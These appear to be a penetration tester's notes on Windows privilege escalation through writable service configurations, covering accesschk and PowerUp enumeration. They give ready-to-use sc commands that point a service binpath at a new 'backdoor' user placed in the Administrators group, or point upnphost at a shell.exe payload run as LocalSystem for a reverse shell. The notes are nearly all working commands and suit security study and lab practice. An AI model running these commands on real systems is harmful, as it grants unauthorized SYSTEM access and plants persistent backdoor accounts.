
## Writable Path \(accesschk.exe &gt; upnphost\)

\(1\) Accesschk for any writable path
  
\(2\) sc qc to query 
  
\(3\) method1: adding backdoor user to admin group
  
\(4\) method2: adding binary payload 

```powershell
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
accesschk.exe -qdws Users C:\Windows\ /accepteula

# Or 

accesschk.exe -wuvc daclsvc /accepteula
```

![[Pasted image 20210629230144.png]]

### Querying Service 

```powershell
# With powershell/PowerUp
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceDetail

# Querying service
sc qc <vuln-service>
```

### Method 1: Adding backdoor user to admin group

```powershell
sc qc <vuln-service>
sc config <vuln-service> binpath= "net user backdoor backdoor123 /add" 
sc stop <vuln-service>
sc start <vuln-service>

sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add" 
sc stop <vuln-service>
sc start <vuln-service>
```

### Method 2: Adding binary payload

```powershell
sc config upnphost binpath= "C:\Inetpub\ftproot\shell.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""
sc stop upnphost

# run reverse shell listener

net start upnphost
```
